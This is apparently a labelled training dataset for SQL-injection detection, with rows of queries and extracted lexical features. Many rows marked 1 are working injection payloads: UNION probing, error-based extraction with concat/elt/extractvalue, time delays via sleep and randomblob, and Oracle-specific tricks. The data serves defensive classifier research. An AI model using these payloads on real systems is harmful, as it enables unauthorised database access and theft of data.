Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""twpn"" like ""twpn",1,or select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and twpn like twpn,297,16,0,4,7,0,48,2,2,63,9,3
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,select from users where id or or,59,7,0,2,3,2,16,2,3,26,5,0
1'  )   as sjij where 8659  =  8659,1,as sjij where,35,3,1,0,1,0,7,0,0,11,2,0
"  select hurryid as id, modern as broke from stage",0,select hurryid as id modern as broke from stage,50,9,0,0,1,0,9,0,0,39,4,0
"-5210""  )   where 7176  =  7176 or 6872  =  6872--",1,where or,50,2,0,1,2,1,9,1,3,7,2,0
"   select count ( negative ) , attack from night by lonely",0,select count negative attack from night by lonely,58,8,0,0,1,0,11,0,0,42,3,1
"antonio asenjo, 178, 6?h",0,antonio asenjo,24,2,0,0,3,0,3,0,0,14,0,0
barnechea,0,barnechea,9,1,0,0,0,0,0,0,0,9,0,0
"-8491"" where 9043  =  9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",1,where union all select,90,4,0,1,9,1,8,0,3,19,4,0
"-5187""  )   union all select 3373,3373#",1,union all select,39,3,0,1,2,1,5,0,1,14,3,0
"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,where or select count from domain domains as t1 domain columns as t2 domain tables as t3,141,17,0,0,7,1,24,1,3,69,7,1
select * from upper where seat like '%ice%',0,select from upper where seat like ice,43,7,2,0,2,0,7,0,1,31,4,1
luczka graciot,0,luczka graciot,14,2,0,0,0,0,1,0,0,13,0,0
agalladura,0,agalladura,10,1,0,0,0,0,0,0,0,10,0,0
ozoa cadaveira,0,ozoa cadaveira,14,2,0,0,0,0,1,0,0,13,0,0
"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569",1,or elt and,68,3,0,0,3,0,13,2,1,8,2,1
"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""tepf""  =  ""tepf",1,and select from select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from information_schema character_sets group by and tepf tepf,308,20,0,4,10,0,53,2,2,108,9,5
select * from spite fetch first 3 rows only select top 50 percent * from describe,0,select from spite fetch first rows only select top percent from describe,81,12,0,0,0,0,15,0,2,61,6,0
"-8414%""  )   union all select 2795#",1,union all select,35,3,0,1,2,1,5,0,1,14,3,0
44494,0,,5,0,0,0,0,0,0,0,0,0,0,0
delete from bush where deal = 'inside',0,delete from bush where deal inside,38,6,2,0,1,0,6,0,0,29,3,0
"insert into chair ( answer, action, pictured, disease, end, screen )  values  ( 'scene', 'idea'. likely', 'made', 'donkey', 'land', 'atomic' )  ",0,insert into chair answer action pictured disease end screen values scene idea likely made donkey land atomic,144,17,13,0,11,0,21,0,0,92,4,0
"1'   )    )    as ovbz where 3203  =  3203   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,as ovbz where select case when then regexp_substring repeat left crypt_key char char char null null else char char char char end from values,376,24,1,0,18,1,75,0,2,115,13,11
"-9505'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qhdg'  =  'qhdg",1,or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and qhdg qhdg,386,25,4,0,26,0,79,2,1,91,9,10
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""fqeu"" like ""fqeu",1,and like abcdefg upper hex randomblob and fqeu like fqeu,125,10,2,4,2,0,20,2,1,47,4,3
""" or 1  =  1--",1,or,14,1,0,1,1,1,4,1,2,2,0,0
spears,0,spears,6,1,0,0,0,0,0,0,0,6,0,0
gall20o,0,gall20o,7,1,0,0,0,0,0,0,0,5,0,0
ares,0,ares,4,1,0,0,0,0,0,0,0,4,0,0
du-tuan,0,du tuan,7,2,0,0,0,0,0,0,1,6,0,0
select bottle from boy,0,select bottle from boy,22,4,0,0,0,0,3,0,0,19,2,0
5.88668e+15,0,88668e,11,1,0,0,1,0,0,0,1,1,0,0
6287,0,,4,0,0,0,0,0,0,0,0,0,0,0
select * from edge,0,select from edge,18,3,0,0,0,0,3,0,1,14,2,0
19310,0,,5,0,0,0,0,0,0,0,0,0,0,0
select avg ( instance ) from spite,0,select avg instance from spite,34,5,0,0,0,0,6,0,0,26,2,1
select * from they where element like '%luck%',0,select from they where element like luck,46,7,2,0,2,0,7,0,1,34,4,0
dierkop@hayunmundoahifuera.id,0,dierkop hayunmundoahifuera id,29,3,0,0,2,0,0,0,0,27,0,0
"1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,where or char char char char regexp_substring repeat left crypt_key char char char null null,252,15,1,0,18,1,51,1,2,76,5,11
"   select count ( couple ) , recent from serious by golden",0,select count couple recent from serious by golden,58,8,0,0,1,0,11,0,0,42,3,1
08466616v,0,08466616v,9,1,0,0,0,0,0,0,0,1,0,0
"  select str_to_date ( ""2017,8,14 10,40,10"", ""%y,%m,%d %h,%i,%s"" ) ;",0,select str_to_date,68,2,0,4,18,0,9,0,0,21,1,0
"   select hand, cheese+ ', ' + treated+ ' ' + plain+ ', ' + went as create  from test",0,select hand cheesetreated plain went as create from test,85,9,6,0,3,0,19,0,6,48,4,0
select top 3 * from curious select * from halfway 3select * from telephone,0,select top from curious select from halfway 3select from telephone,74,10,0,0,0,0,13,0,3,56,6,0
57186589x,0,57186589x,9,1,0,0,0,0,0,0,0,1,0,0
select * from variety where social = 'business'  or fur = 'highest',0,select from variety where social business or fur highest,67,9,4,0,2,0,11,1,1,48,4,0
select min ( truck )  as me from west,0,select min truck as me from west,37,7,0,0,0,0,8,0,0,26,3,0
rubio,0,rubio,5,1,0,0,0,0,0,0,0,5,0,0
c/ hinojo 130 4?c,0,hinojo,17,1,0,0,1,0,3,0,1,8,0,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1,call regexp_substring repeat right char null,107,6,1,0,6,0,18,0,0,38,3,4
select min ( doubt )  as horn from work,0,select min doubt as horn from work,39,7,0,0,0,0,8,0,0,28,3,0
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1,union all select,60,3,1,0,8,1,4,0,1,14,3,0
-1772' or 7911  =  4985#,1,or,24,1,1,0,2,1,4,1,1,2,0,0
select top 50 percent * from furniture select * from change fetch first 50 percent rows onlyselect top 3 * from then,0,select top percent from furniture select from change fetch first percent rows onlyselect top from then,116,16,0,0,0,0,21,0,3,87,9,0
24443,0,,5,0,0,0,0,0,0,0,0,0,0,0
mcallum,0,mcallum,7,1,0,0,0,0,0,0,0,7,0,0
1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,1,select stsu where or sleep,62,5,3,0,2,1,13,1,1,22,3,1
select option_value from wp_options where option_name  =  '_transient_wp_stateless_google_sdk_conflict' limit 1,0,select option_value from wp_options where option_name _transient_wp_stateless_google_sdk_conflict limit,111,8,2,0,10,0,9,0,0,87,4,0
"  select ballid as id, table as fallen from frighten",0,select ballid as id table as fallen from frighten,52,9,0,0,1,0,9,0,0,41,4,0
"1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,as rwsn where or extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71,180,11,0,0,7,1,29,1,2,47,4,3
"   select mouse, desk, bat from apartment where late  is null",0,select mouse desk bat from apartment where late is null,61,10,0,0,2,0,10,0,0,46,5,0
"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,as hoiv where and exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78,206,14,0,1,7,1,38,1,3,55,7,3
select * from route fetch first 3 rows only,0,select from route fetch first rows only,43,7,0,0,0,0,8,0,1,33,3,0
27253689t,0,27253689t,9,1,0,0,0,0,0,0,0,1,0,0
